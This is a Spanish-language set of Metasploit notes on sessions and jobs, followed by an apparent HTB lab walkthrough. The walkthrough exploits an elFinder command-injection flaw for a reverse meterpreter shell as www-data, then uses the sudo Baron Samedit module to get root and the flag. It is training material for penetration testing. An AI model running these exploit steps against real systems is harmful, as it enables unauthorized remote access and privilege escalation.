## Listar sesiones de Metasploit
Podemos listar las sesiones activas de MSFCONSOLE con:
```
msf > sessions
```
Dando como salida: 
```shell-session
Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```

Podemos acceder a una sesión concreta con:
```shell-session
msf > sessions -i 1
[*] Starting interaction with 1...
```


### jobs (msfconsole)
Por ejemplo, si ejecutamos un exploit activo en un puerto específico y lo necesitamos para un módulo diferente, no podemos simplemente cerrar la sesión con \[Ctrl] + \[C]. Si lo hiciéramos, el puerto seguiría en uso, lo que afectaría el uso del nuevo módulo. Por lo tanto, necesitaríamos usar el comando jobs para revisar las tareas activas que se ejecutan en segundo plano y cerrar las antiguas para liberar el puerto.

Otros tipos de tareas dentro de las sesiones también pueden convertirse en trabajos para que se ejecuten en segundo plano sin problemas, incluso si la sesión finaliza o desaparece.

### exploit -h
Cuando ejecuto `exploit -j` Metasploit lanza el exploit en segundo plano como un “job” (un trabajo). Sustituiríamos el "run"/"exploit" por "exploit -j" Eso significa que el módulo queda corriendo (por ejemplo, un _handler_ que escucha conexiones reversas) y te devuelve el control del prompt para que puedas hacer otras cosas mientras tanto.

Por qué usar `-j` (ventajas):
- Mantienes el _handler_ escuchando en segundo plano sin bloquear tu consola.
- Puedes lanzar varios handlers/exploits a la vez.
- Te permite moverte por el framework, revisar sesiones, escanear, etc., mientras el job está activo.
### jobs -l
Para listar todos los jobs activos en meterpreter.

### jobs -k \[num]
Para eliminar un proceso concreto.


### Cómo dejar una sesión en segundo plano (Meterpreter)

1. Cuando estés en el prompt de **meterpreter**, escribe:
```background
```
Eso devuelve el control a msfconsole y deja la sesión abierta en segundo plano.

2. Para ver las sesiones abiertas desde `msfconsole`:
```
sessions -l
```

3. Para volver a interactuar con una sesión (por ejemplo la sesión 1):
```
sessions -i 1
```
---
## QUESTIONS
**TARGET:  10.129.203.52**
**1. The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?**

Realizamos un curl a dicha dirección IP:
```
curl 10.129.203.52
```
 Y obtenemos, entre otra información:
```
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
		<title>elFinder 2.1.x source version with PHP connector</title>             <-----------

		<!-- Require JS (REQUIRED) -->
...
```

Respuesta: *elFinder*

**2.Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?**

En msfconsole, realizando un "search elFinder", se obtiene la siguiente salida: 

```
[msf](Jobs:0 Agents:0) >> search elfinder

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection

```

Probaré el exploit 3 (y el 4 si no funcionase).

```
use 3                    #exploit(linux/http/elfinder_archive_cmd_injection)
set RHOST 10.129.203.52
set LHOST 10.10.14.232   #consultado con ip a, en la interfaz tun0
run
```

Haciendo un "run", se obtiene una sesión de meterpreter. 

Ejecuto finalmente:
```
shell
whoami
```

Siendo la respuesta "www-data".

**3. The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.**
Dentro de la shell de meterpreter, ejecuto un:
```
sudo -V
```

Para ver la versión de sudo que cuenta el sistema.
Observo que es la:
``` 
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

Haciendo un "search sudo 1.8" observo la siguiente salida:
```
msf](Jobs:0 Agents:0) >> search sudo 1.8

Matching Modules
================

   #   Name                                                                    Disclosure Date  Rank       Check  Description
   -   ----                                                                    ---------------  ----       -----  -----------
   0   exploit/linux/local/sudo_baron_samedit                                  2021-01-26       excellent  Yes    Sudo Heap-Based Buffer Overflow
   1     \_ target: Automatic                                                  .                .          .      .
   2     \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)                .                .          .      .
   3     \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31) - alternative  .                .          .      .
   4     \_ target: Ubuntu 19.04 x64 (sudo v1.8.27, libc v2.29)                .                .          .      .
   5     \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27)                .                .          .      .
   6     \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27) - alternative  .                .          .      .
   7     \_ target: Ubuntu 16.04 x64 (sudo v1.8.16, libc v2.23)                .                .          .      .
   8     \_ target: Ubuntu 14.04 x64 (sudo v1.8.9p5, libc v2.19)               .                .          .      .
   9     \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28)                   .                .          .      .
   10    \_ target: Debian 10 x64 (sudo v1.8.27, libc v2.28) - alternative     .                .          .      .
   11    \_ target: CentOS 8 x64 (sudo v1.8.25p1, libc v2.28)                  .                .          .      .
   12    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17)                    .                .          .      .
   13    \_ target: CentOS 7 x64 (sudo v1.8.23, libc v2.17) - alternative      .                .          .      .
   14    \_ target: Fedora 27 x64 (sudo v1.8.21p2, libc v2.26)                 .                .          .      .
   15    \_ target: Fedora 26 x64 (sudo v1.8.20p2, libc v2.25)                 .                .          .      .
   16    \_ target: Fedora 25 x64 (sudo v1.8.18, libc v2.24)                   .                .          .      .
   17    \_ target: Fedora 24 x64 (sudo v1.8.16, libc v2.23)                   .                .          .      .
   18    \_ target: Fedora 23 x64 (sudo v1.8.14p3, libc v2.22)                 .                .          .      .
   19    \_ target: Manual                                                     .                .          .      .
   20  exploit/linux/local/sudoedit_bypass_priv_esc                            2023-01-18       excellent  Yes    Sudoedit Extra Arguments Priv Esc
   21  exploit/linux/ssh/vyos_restricted_shell_privesc                         2018-11-05       great      Yes    VyOS restricted-shell Escape and Privilege Escalation

```

Lo selecciono:
```
use 0
```

Y realizo un:
```
show targets
```

Para asegurarme que la opción "1. Automatic" es la seleccionada. 
Haciendo un "options", observo que pide:
```
Module options (exploit/linux/local/sudo_baron_samedit):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   SESSION                       yes       The session to run this module on
   WritableDir  /tmp             yes       A directory where you can write files.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  94.237.63.12     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port           <-------- ojo!! este ya está ocupado por el meterpreter, tendré que cambiarlo.


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Ojo! Me piden una SESSION, un LHOST y un LPORT.

El LHOST tiene que ser el de la máquina atacante. En este caso, el mismo que el utilizado en el ejercicio 1: "10.10.14.232".
Por otro lado, nos pide una SESSION:
- Para conseguir una SESSION debo hacer el mismo proceso que en el ejercicio 1 y cuando alcance una sessión de meterpreter disponible ejecutaré "background".
- Esto dejará una sessión abierta en segundo plano (que puedo listar con "sessions -l" y puedo interactuar de nuevo con "sessions -i  \<session_id>").

Vuelvo al módulo y ejecuto:
```
set LPORT 4443 (uno diferente que el utilizado en la sesión meterpreter)
set LHOST 10.10.14.232   # consultado con ip a, en la interfaz tun0
set SESSION 1            # es la session de meterpreter abierta en "background"
```

Ejecuto "run" o "exploit" y obtengo una sessión2 de meterpreter, en este caso, con usuario root.

Respuesta de la flag: "HTB{5e55ion5_4r3_sw33t}"







